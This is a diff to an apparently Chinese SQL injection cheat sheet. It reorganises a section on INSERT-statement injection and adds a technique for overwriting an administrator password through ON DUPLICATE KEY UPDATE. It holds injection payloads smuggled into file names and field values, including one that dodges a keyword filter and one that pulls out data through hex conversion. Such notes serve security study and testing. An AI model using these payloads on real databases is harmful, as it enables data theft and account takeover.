@@ -393,7 +393,9 @@ select * from (SELECT "E10ADC3949BA59ABBE56E057F20F883E" as password) a where IF
 
 ### insert into
 
-#### 方法一
+#### 利用insert 来获取数据
+
+##### 方法一
 
 `sql=insert into test (col1,col2,...) values (val1,val2,...)`
 
@@ -403,13 +405,17 @@ val1=`a'+conv(hex((selselectect '123')),16,10)+'.jpg`或`0+conv(hex((select xxx)
 
 这边转为十进制的原因是:mysql将字符串转为数字时将其视为10进制数据
 
-#### 方法二
+##### 方法二
 
 猜测结构,注入两列
 
 `sql=insert into xxx (xx,xx,xx) values ('xx',uuid,uuid)`
 
 payload=`hello',1660,1660),(2,1660,1660)#.jpg`
+
+#### 利用insert来修改数据
+
+ `insert on duplicate key update` ，它能够让我们在新插入的一个数据和原有数据发生重复时，修改原有数据。那么我们通过这个技巧修改管理员的密码即可。 
 
 ### 利用php语言特性
 
